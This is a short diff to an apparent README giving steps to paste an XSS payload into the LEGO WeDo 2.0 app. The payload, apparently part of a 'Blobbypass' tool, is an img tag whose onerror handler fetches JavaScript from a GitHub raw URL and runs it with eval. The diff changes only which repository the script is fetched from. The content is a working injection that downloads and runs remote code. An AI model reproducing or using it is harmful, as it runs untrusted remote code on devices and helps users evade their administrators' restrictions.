@@ -8,7 +8,7 @@
 * Then, click the green document button.
 * In the textbox, paste the following string:
 ```
-<img src=# onerror='fetch("https://raw.githubusercontent.com/Blobby-Boi/BlobbypassXSS/main/main.js").then(r=>r.text()).then(c=>eval(c)) '>
+<img src=# onerror='fetch("https://raw.githubusercontent.com/Vikvippro12345/BlobbypassLEGO/refs/heads/main/BlobbypassXSS/main/main.js").then(r=>r.text()).then(c=>eval(c)) '>
 ```
 * Close LEGO WeDo 2.0 and re-enable your WiFi.
 
